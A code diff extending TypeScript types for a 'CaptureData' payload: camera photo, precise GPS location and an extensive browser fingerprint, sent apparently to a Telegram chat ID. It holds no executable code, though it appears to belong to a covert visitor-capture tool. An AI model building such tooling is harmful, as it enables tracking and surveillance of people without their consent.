@@ -10,10 +10,20 @@ export interface HealthStatus {
 }
 
 export interface LocationData {
-  latitude?: number;
-  longitude?: number;
+  /** @nullable */
+  latitude?: number | null;
+  /** @nullable */
+  longitude?: number | null;
   /** @nullable */
   accuracy?: number | null;
+  /** @nullable */
+  altitude?: number | null;
+  /** @nullable */
+  altitudeAccuracy?: number | null;
+  /** @nullable */
+  heading?: number | null;
+  /** @nullable */
+  speed?: number | null;
   /** @nullable */
   city?: string | null;
 }
@@ -21,26 +31,98 @@ export interface LocationData {
 export interface DeviceInfo {
   userAgent?: string;
   platform?: string;
+  vendor?: string;
+  language?: string;
+  languages?: string[];
+  timezone?: string;
+  /** @nullable */
+  timezoneOffset?: number | null;
+  cookieEnabled?: boolean;
+  /** @nullable */
+  doNotTrack?: string | null;
+  onLine?: boolean;
+  /** @nullable */
+  hardwareConcurrency?: number | null;
+  /** @nullable */
+  deviceMemory?: number | null;
+  /** @nullable */
+  maxTouchPoints?: number | null;
   screenWidth?: number;
   screenHeight?: number;
-  language?: string;
-  timezone?: string;
-  /**
-     * Battery level 0-100
-     * @nullable
-     */
+  /** @nullable */
+  screenAvailWidth?: number | null;
+  /** @nullable */
+  screenAvailHeight?: number | null;
+  /** @nullable */
+  colorDepth?: number | null;
+  /** @nullable */
+  pixelDepth?: number | null;
+  /** @nullable */
+  devicePixelRatio?: number | null;
+  /** @nullable */
+  innerWidth?: number | null;
+  /** @nullable */
+  innerHeight?: number | null;
+  /** @nullable */
+  orientationType?: string | null;
+  /** @nullable */
+  orientationAngle?: number | null;
+  /** @nullable */
   battery?: number | null;
   /** @nullable */
+  charging?: boolean | null;
+  /** @nullable */
+  chargingTime?: number | null;
+  /** @nullable */
+  dischargingTime?: number | null;
+  /** @nullable */
   connectionType?: string | null;
+  /** @nullable */
+  connectionDownlink?: number | null;
+  /** @nullable */
+  connectionRtt?: number | null;
+  /** @nullable */
+  connectionSaveData?: boolean | null;
+  /** @nullable */
+  gpuRenderer?: string | null;
+  /** @nullable */
+  gpuVendor?: string | null;
+  /** @nullable */
+  webglSupported?: boolean | null;
+  /** @nullable */
+  webAssemblySupported?: boolean | null;
+  /** @nullable */
+  serviceWorkerSupported?: boolean | null;
+  /** @nullable */
+  notificationPermission?: string | null;
+  /** @nullable */
+  cameraCount?: number | null;
+  /** @nullable */
+  microphoneCount?: number | null;
+  /** @nullable */
+  pluginsCount?: number | null;
+  pluginsList?: string[];
+  /** @nullable */
+  referrer?: string | null;
+  /** @nullable */
+  historyLength?: number | null;
+  /** @nullable */
+  pdfViewerEnabled?: boolean | null;
+  /** @nullable */
+  cookiesBlocked?: boolean | null;
+  /** @nullable */
+  localStorageEnabled?: boolean | null;
+  /** @nullable */
+  sessionStorageEnabled?: boolean | null;
+  /** @nullable */
+  indexedDbEnabled?: boolean | null;
+  /** @nullable */
+  adBlockEnabled?: boolean | null;
 }
 
 export interface CaptureData {
-  /** Telegram chat ID to send data to */
   chatId: string;
-  /**
-     * Base64 encoded photo from camera (data URL)
-     * @nullable
-     */
+  /** @nullable */
   photo?: string | null;
   location?: LocationData;
   deviceInfo?: DeviceInfo;
